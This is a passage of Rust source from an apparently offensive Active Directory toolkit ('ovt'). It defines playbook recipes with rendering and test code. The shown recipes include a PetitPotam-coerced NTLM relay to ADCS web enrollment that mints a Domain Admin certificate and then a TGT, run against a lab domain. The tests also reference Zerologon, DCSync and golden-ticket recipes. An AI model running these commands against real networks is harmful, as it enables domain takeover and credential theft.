                note: "graph build crawls + links ACLs, delegations & memberships into one digraph.",
            },
            Step {
                title: "2) Paths",
                commands: &[
                    "ovt graph path vagrant \"Domain Admins\"",
                    "ovt graph path-to-da vagrant",
                    "ovt graph export --output bloodhound.json --bloodhound",
                ],
                note: "path-to-da computes Dijkstra over edge costs; export writes BH-compatible json.",
            },
        ],
    },
    Recipe {
        name: "relay-to-da",
        aliases: &["esc8-plus-ldap"],
        summary: "Coerce DC into relaying towards certsrv to mint DomainAdmin (ADCS ESC8 + LDAP combo).",
        prereqs: &[
            "DC reachable",
            "ADC web enrollment (certsrv) without signing",
        ],
        steps: &[
            Step {
                title: "1) Bring up the HTTP relay pointing at certsrv, coercion built-in (PetitPotam against the DC)",
                commands: &[
                    "ovt ntlm relay --targets \"http://192.168.57.10/certsrv/\" --port 8080 --auto-coerce-targets \"kingslanding.sevenkingdoms.local\" --auto-coerce-domain sevenkingdoms.local --auto-coerce-user vagrant --auto-coerce-password vagrant",
                ],
                note: "The relay controller fires PetitPotam (MS-EFSRPC) at the DC FQDN with your listener IP; the DC machine-account auth lands on the HTTP listener and is replayed at certsrv -- the ESC8 outcome.",
            },
            Step {
                title: "2) Use the minted DA certificate (PKINIT)",
                commands: &[
                    "ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local --pkinit-cert ./esc1_cert.pem --pkinit-key ./esc1_cert.pem.key",
                ],
                note: "PKINIT globals exist on every command: --pkinit-cert / --pkinit-key (PEM). With the DA TGT: dump NTDS offline (see dcsync recipe).",
            },
        ],
    },
];

/// Look up a recipe by canonical name or any alias (case-insensitive).
pub fn find_recipe(input: &str) -> Option<&'static Recipe> {
    let needle = input.trim().to_lowercase();
    RECIPES.iter().find(|r| {
        r.name.eq_ignore_ascii_case(&needle)
            || r.aliases
                .iter()
                .any(|a| a.trim().eq_ignore_ascii_case(&needle))
    })
}

/// Rendered listing: one line per scenario.
pub fn render_list() -> String {
    let mut out = String::new();
    out.push_str(&format!("{}\n\n", "Overthrone scenario playbook".bold()));
    for r in RECIPES {
        out.push_str(&format!("  {:<14} {}\n", r.name.cyan(), r.summary));
    }
    out.push_str(&format!(
        "\n  {} scenario(s). Show one: {} {} (aliases accepted, case-insensitive)\n",
        RECIPES.len(),
        "ovt playbook show".yellow(),
        "<name>".yellow()
    ));
    out
}

/// Rendered full recipe page.
pub fn render_show(recipe: &Recipe) -> String {
    let mut out = String::new();
    out.push_str(&format!("{}\n", recipe.name.to_uppercase().bold().cyan()));
    out.push_str(&format!("{}\n\n", recipe.summary));

    out.push_str(&format!("{}\n", "Prerequisites:".bold()));
    out.push('\n');
    for p in recipe.prereqs {
        out.push_str(&format!("  - {p}\n"));
    }
    out.push('\n');

    let mut index = 1;
    for step in recipe.steps.iter() {
        let start = index;
        let end = index + step.commands.len() - 1;
        out.push_str(&format!("[{start}-{end}] {}\n", step.title.bold()));
        for cmd in step.commands {
            out.push_str(&format!("  {}\n", cmd.bright_white()));
        }
        if !step.note.is_empty() {
            out.push_str(&format!("  # {}\n", step.note.bright_black()));
        }
        out.push('\n');
        index = end + 1;
    }
    out
}

/// `ovt playbook list` -- print the scenario table.
pub fn cmd_list() -> i32 {
    println!("{}", render_list());
    0
}

/// `ovt playbook show <name>` -- print one recipe; 1 if unknown.
pub fn cmd_show(name: &str) -> i32 {
    match find_recipe(name) {
        Some(recipe) => {
            println!("{}", render_show(recipe));
            0
        }
        None => {
            eprintln!(
                "{} unknown scenario `{}` -- see possible values with `ovt playbook list`",
                "[-]".red(),
                name
            );
            1
        }
    }
}

// ----------------------------------------------------------
//  Tests
// ----------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_recipe_names_unique() {
        let mut names: Vec<&str> = RECIPES.iter().map(|r| r.name).collect();
        names.sort_unstable();
        let before = names.len();
        names.dedup();
        assert_eq!(names.len(), before, "duplicate scenario names");
    }

    #[test]
    fn test_all_commands_are_ovt_invocations() {
        for recipe in RECIPES {
            for step in recipe.steps {
                for cmd in step.commands {
                    assert!(
                        cmd.starts_with("ovt "),
                        "recipe `{}` step `{}` command must start with 'ovt ': {cmd}",
                        recipe.name,
                        step.title
                    );
                }
            }
        }
    }

    #[test]
    fn test_steps_have_content() {
        for recipe in RECIPES {
            assert!(
                !recipe.steps.is_empty(),
                "recipe {} has no steps",
                recipe.name
            );
            assert!(
                !recipe.summary.is_empty(),
                "recipe {} has no summary",
                recipe.name
            );
            for step in recipe.steps {
                assert!(!step.commands.is_empty(), "empty step in {}", recipe.name);
                assert!(!step.title.is_empty());
            }
        }
    }

    #[test]
    fn test_find_recipe_by_name_and_alias() {
        assert!(find_recipe("kerberoast").is_some());
        assert!(find_recipe("KERBEROAST").is_some());
        assert!(find_recipe("cve-2021-42278").is_some(), "alias samname");
        assert!(find_recipe("cve-2020-1472").is_some(), "alias zerologon");
        assert!(find_recipe("golden-ticket").is_some(), "alias golden");
        assert!(find_recipe("petitpotam").is_some(), "alias relay");
        assert!(find_recipe("certify").is_some(), "alias adcs");
        assert!(find_recipe("does-not-exist").is_none());
        assert!(find_recipe("").is_none());
    }

    #[test]
    fn test_find_recipe_tolerates_whitespace() {
        assert!(find_recipe("  recon  ").is_some());
        assert!(find_recipe("\tLAPS\n").is_some());
    }

    #[test]
    fn test_render_list_includes_every_name() {
        let rendered = render_list();
        for recipe in RECIPES {
            assert!(
                rendered.contains(recipe.name),
                "list missing scenario {}",
                recipe.name
            );
        }
        assert!(rendered.contains("ovt playbook show"));
    }

    #[test]
    fn test_render_show_includes_prereqs_commands_notes() {
        let recipe = find_recipe("zerologon").unwrap();
        let rendered = render_show(recipe);
        assert!(rendered.contains("ZEROLOGON"));
        for p in recipe.prereqs {
            assert!(rendered.contains(p), "show missing prereq {p}");
        }
        for step in recipe.steps {
            for cmd in step.commands {
                assert!(rendered.contains(cmd), "show missing command {cmd}");
            }
        }
        assert!(rendered.contains("[1-2]"), "step numbering rendered");
    }

    #[test]
    fn test_render_show_step_numbering_spans() {
        let recipe = find_recipe("recon").unwrap();
        let rendered = render_show(recipe);
        // recon: 2 + 3 + 5 + 1 commands -> steps [1-2] [3-5] [6-10] [11-11]
        assert!(rendered.contains("[1-2]"), "first step span");
        assert!(rendered.contains("[3-5]"), "second step span");
        assert!(rendered.contains("[6-10]"), "third step span");
        assert!(
            rendered.contains("[11-11]"),
            "single-command span: {}",
            rendered
                .lines()
                .filter(|l| l.starts_with('['))
                .collect::<Vec<_>>()
                .join(" | ")
        );
    }

    #[test]
    fn test_playbook_techniques_cover_core_kill_chain() {
        for expected in [
            "recon",
            "kerberoast",
            "dcsync",
            "golden",
            "lateral",
            "rbcd",
            "adcs",
            "relay",
            "mssql",
            "laps",
        ] {
            assert!(
                find_recipe(expected).is_some(),
                "missing {expected} scenario"
            );
        }
    }

    #[test]
    fn test_recipe_count_is_sane() {
        let count = RECIPES.len();
        assert!(
            (15..=30).contains(&count),
            "unexpected recipe count: {count}"
        );
    }
}
